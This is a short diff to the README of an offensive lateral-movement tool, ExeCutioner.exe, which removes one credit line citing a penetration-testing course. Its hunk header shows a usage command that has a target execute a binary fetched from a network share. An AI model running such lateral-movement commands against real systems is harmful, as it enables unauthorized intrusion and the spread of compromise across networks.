@@ -52,7 +52,6 @@ ExeCutioner.exe /t <target name or IP> /cmd <\\192.168.10.8\\lateralmovement.exe
 
 # Credits
 - Heavily inspired by "[chvancooten](https://github.com/chvancooten/OSEP-Code-Snippets)" 
-- Invaluable knowledge from the "[OSEP Course](https://www.offensive-security.com/pen300-osep/)"
 - Great resource from "[Microsoft](https://docs.microsoft.com/en-us/dotnet/api/system.security.principal.windowsidentity.impersonate?view=netframework-4.8)"
 
 
